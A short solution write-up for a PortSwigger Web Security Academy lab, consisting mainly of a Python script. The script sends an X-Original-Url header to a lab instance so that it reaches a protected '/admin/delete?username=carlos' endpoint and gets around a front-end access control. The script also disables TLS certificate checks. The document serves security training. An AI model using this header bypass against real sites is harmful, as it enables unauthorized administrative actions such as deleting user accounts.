# Lab: URL-based access control can be circumvented

Link to lab: https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup


url = 'https://0a7f00aa038d6f64c6b65f9900e700b6.web-security-academy.net/'

headers = {
    'X-Original-Url': '/admin/delete?username=carlos',
}

params = {
    'username': 'carlos',
}

response = requests.get(
    url + 'login',
    params=params,
    headers=headers,
    verify=False,
)

print(response.text)
```